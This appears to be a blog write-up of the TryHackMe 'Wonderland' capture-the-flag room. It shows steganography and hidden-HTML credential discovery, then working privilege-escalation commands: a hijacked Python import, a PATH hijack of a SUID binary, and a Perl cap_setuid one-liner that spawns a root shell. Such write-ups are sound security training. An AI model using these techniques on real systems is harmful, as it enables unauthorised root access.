---
title: 'Wonderland'
target: 'TryHackMe — Wonderland'
difficulty: 'medium'
date: 2026-08-27
summary: 'An Alice in Wonderland-themed box where everything is upside down — the user flag is in /root, the root flag is in alice''s home, and the path from initial access to root chains steganography, Python library hijacking, SUID PATH manipulation, and a Linux capabilities exploit on Perl.'
role: 'pentest'
tags: ['Steganography', 'Gobuster', 'Python library hijack', 'PATH hijack', 'SUID', 'Linux capabilities', 'GTFObins', 'Perl', 'cap_setuid']
problem: 'A Wonderland-themed Ubuntu box with SSH and HTTP exposed. The twist: flags are in the wrong places, and reaching root requires chaining through three intermediate users — each guarded by a different privilege escalation technique spanning Python import hijacking, SUID binary exploitation, and Linux capabilities abuse.'
action: 'Enumerated the web server and extracted hidden credentials via steganography and HTML source inspection, then escalated through three users: hijacked Python''s module search order to pivot from alice to rabbit, exploited a relative path call in a SUID binary to move from rabbit to hatter, and abused cap_setuid on Perl to reach root.'
outcome: 'Full root compromise through a four-user chain, with both flags captured from their inverted locations — user.txt from /root and root.txt from /home/alice.'
draft: false
---

Wonderland is a themed box where the Alice in Wonderland aesthetic isn't
just decoration — it's built into the logic. Flags are in the wrong
directories, the escalation path goes through three intermediate users,
and each hop uses a different technique. The room is rated medium, but the
chain from initial access to root covers steganography, Python library
hijacking, PATH manipulation on a SUID binary, and Linux capabilities
exploitation — four distinct concepts stitched into one path.

## Enumeration

Starting with nmap:

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

Two ports open: **SSH (22)** running OpenSSH 7.6p1 Ubuntu, and **HTTP
(80)** running a Golang `net/http` server. SSH needs credentials we don't
have yet, so the web server is the starting point.

## Web enumeration and steganography

The homepage at `http://<TARGET_IP>/` shows a white rabbit image and the
text "Follow the White Rabbit." No links, no forms, no interactive
elements — just a static page with an image.

CTF rooms love hiding data in images. Downloading the rabbit image and
running steghide with an empty passphrase:

```bash
wget http://<TARGET_IP>/img/white_rabbit_1.jpg
steghide extract -sf white_rabbit_1.jpg
```

Pressing Enter at the passphrase prompt extracts `hint.txt`:

```
follow the r a b b i t
```

The spaced-out letters spell a directory path: `/r/a/b/b/i/t`.

Running Gobuster confirms the first directory exists:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```
/r       (Status: 301)
/img     (Status: 301)
/poem    (Status: 301)
```

Following the hint through each nested directory — `/r/`, `/r/a/`,
`/r/a/b/`, `/r/a/b/b/`, `/r/a/b/b/i/`, `/r/a/b/b/i/t/` — each page
says "Keep Going" until the final one: "Open the door and enter the
wonderland."

Viewing the page source at `/r/a/b/b/i/t/` reveals a `<p>` tag hidden
with `display: none`:

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

CSS `display: none` hides elements visually in the browser, but the HTML
source still contains the data. Credentials: **alice** /
**HowDothTheLittleCrocodileImproveHisShiningTail**.

## Initial access — SSH as alice

```bash
ssh alice@<TARGET_IP>
```

Logged in. The home directory contains `root.txt` (owned by root, can't
read it) and `walrus_and_the_carpenter.py`. The room's "upside down"
theme becomes clear: `user.txt` is in `/root`, and `root.txt` is in
alice's home. The user flag is readable:

```bash
cat /root/user.txt
```

```
thm{"Curiouser and curiouser!"}
```

## Privilege escalation 1 — Python library hijacking (alice -> rabbit)

Checking sudo permissions:

```bash
sudo -l
```

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can run a specific Python script as the `rabbit` user. The script
itself is harmless — it imports `random` and prints ten random lines from
a poem. But the import is exploitable.

Python searches for modules in the current directory first, before system
paths. Checking confirms it:

```bash
python3.6 -c "import sys; print(sys.path)"
```

```
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', ...]
```

The empty string `''` at the start means the current working directory.
Creating a malicious `random.py` in alice's home directory hijacks the
import:

```bash
cat > /home/alice/random.py << 'EOF'
import os
os.system("/bin/bash")
EOF
```

Triggering the exploit:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

```
rabbit@wonderland:/home/alice$
```

The script imports `random`, finds our `random.py` in the current
directory before the real one, and executes `/bin/bash` as rabbit.

## Privilege escalation 2 — PATH hijacking on SUID binary (rabbit -> hatter)

In rabbit's home directory:

```bash
cd /home/rabbit
ls -la
```

```
-rwsr-sr-x 1 root root 8432 May 25  2020 teaParty
```

A SUID binary owned by root. Running it prints a timestamp and crashes
with a segfault. Inspecting with `strings`:

```bash
strings teaParty
```

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

The binary calls `date` without an absolute path — just `date`, not
`/bin/date`. This is the same class of vulnerability as the PATH hijack
in Binex: when a SUID binary uses a relative command name, the shell
resolves it through `$PATH`, and whoever controls `$PATH` controls what
gets executed.

```bash
echo "/bin/bash" > /home/rabbit/date
chmod +x /home/rabbit/date
export PATH=/home/rabbit:$PATH
./teaParty
```

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

The binary called `date`, the shell found `/home/rabbit/date` first
(because we prepended that directory to `$PATH`), and our script spawned
bash as hatter.

Hatter's home directory contains credentials:

```bash
cat /home/hatter/password.txt
```

```
WhyIsARavenLikeAWritingDesk?
```

SSH'ing in as hatter for a clean shell with the full environment — this
matters for the next step:

```bash
ssh hatter@<TARGET_IP>
# Password: WhyIsARavenLikeAWritingDesk?
```

## Privilege escalation 3 — Linux capabilities on Perl (hatter -> root)

Traditional Linux security is binary: root or not root. Linux
capabilities break root's powers into granular pieces. The dangerous one
here is `cap_setuid` — it lets a process change its user ID, which is
normally a root-only operation. If an interpreter like Perl has this
capability, any user who can run Perl can become root.

Scanning for binaries with capabilities:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

Perl has `cap_setuid` with `ep` (effective + permitted). GTFObins has
the exact command:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Breaking it down: `POSIX::setuid(0)` changes the process UID to 0
(root) — only possible because of `cap_setuid` — and `exec "/bin/bash"`
replaces the Perl process with a root bash shell.

```bash
id
```

```
uid=0(root) gid=1000(hatter) groups=1000(hatter)
```

Root. The root flag is in alice's home directory — upside down, as
promised:

```bash
cat /home/alice/root.txt
```

```
thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```

## What I took from this

The Python library hijacking here is the technique I'll remember most,
because it's the subtlest. The SUID PATH hijack and the Perl capabilities
exploit are both well-documented on GTFObins — you find them during
enumeration and apply the known technique. But the Python import hijack
requires understanding how Python resolves modules at runtime: the current
directory comes first in `sys.path`, and if a privileged script imports
anything without an absolute path, you can intercept it. The fix is the
same principle as the PATH hijack fix — use absolute references — but in
Python's case that means either pinning `sys.path` before imports or
running scripts from a directory the user can't write to. The room also
drove home a broader point: every escalation here exploited a search-order
vulnerability. Python searches the current directory for modules, the
shell searches `$PATH` for commands, and Linux searches capabilities
before checking UIDs. Three different systems, same class of bug —
whoever controls what gets found first controls what gets executed.
